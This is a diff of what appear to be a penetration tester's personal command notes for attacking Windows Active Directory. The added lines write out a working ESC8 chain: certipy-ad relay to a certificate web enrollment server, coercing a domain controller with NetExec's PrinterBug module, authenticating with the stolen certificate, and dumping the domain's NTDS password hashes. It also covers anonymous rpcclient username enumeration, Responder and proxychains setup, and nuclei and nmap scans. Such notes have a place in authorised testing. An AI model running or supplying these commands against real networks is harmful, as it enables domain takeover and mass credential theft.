@@ -30,21 +30,29 @@ nano /etc/proxychains4.conf change to port 1080 at bottom
 nano /etc/responder/Responder.conf # HTTP off and SMB off
 
 certipy-ad find -u user@domain.loc -p 'passwd' -dc-ip 192.168.0.1 -vulnerable  (for ESC8 do -all instead of -vulnerable)
-certipy-ad 
+
+--- hit the web enrollment server wit the crtfnsh or w/e
+certipy-ad relay -target http://{other-dc-ip} -template DomainController -debug
+
+nxc smb [DC-IP] -u auser -p 'passwd' -M coerce_plus -o LISTENER=[my-IP] METHOD=PrinterBug   
+
+certipy-ad auth pfx [dc].pfx -dc-ip
+
+ nxc smb [DC-IP] -u '[dc]$' -H [2nd-part-of-has] --ntds drsuapi
 
 
 $ rpcclient -U 'DOMAIN/USER%PASSWD2025!' DC-IP
 
-└─$ rpcclient -U '' -N 10.0.0.50
-rpcclient $> getusername
-Account Name: ANONYMOUS LOGON, Authority Name: NT AUTHORITY
+└─$ rpcclient -U '' -N [DC-IP]
+getusername
 querydominfo
-enumdomusers     (dumps all the usernames, to later spray against)
+enumdomusers     (dumps all the usernames)
 
 ** If you find password_expired.... 
 Run; chgpasswd <username> <oldpasswd> <newtemppasswd>
 
- nuclei -list live_hosts_port80.txt -list live_hosts_port443.txt -es info -es low 
+
+ nuclei -list live_hosts.txt -es info -es low 
 
 -- Check for Cisco Smart Intall
 nmap --open -p 4786 -iL live_hosts.txt | grep "Nmap scan report for" | awk '{print $5}'
